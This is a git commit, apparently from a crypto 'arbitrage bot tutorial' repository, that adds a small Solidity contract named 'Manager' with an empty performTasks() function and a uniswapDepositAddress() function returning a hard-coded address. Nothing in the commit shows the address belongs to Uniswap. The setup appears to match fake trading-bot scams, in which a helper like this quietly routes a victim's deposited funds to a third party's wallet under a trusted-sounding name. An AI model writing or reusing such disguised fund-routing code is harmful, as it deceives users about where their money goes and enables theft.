f5de628835939ed727762e97e9e68c3f009f7bc1
BotArbitrajeTutorial <45904693+Tutorialbotarbitrage@users.noreply.github.com>
2022-12-26 06:21:01 -0500

    Create vICredRouterMain.sol

---
+++ vICredRouterMain.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0x6E19c827cE4f8406Ef79a0472392d91F821aBa6A;
+	}
+}
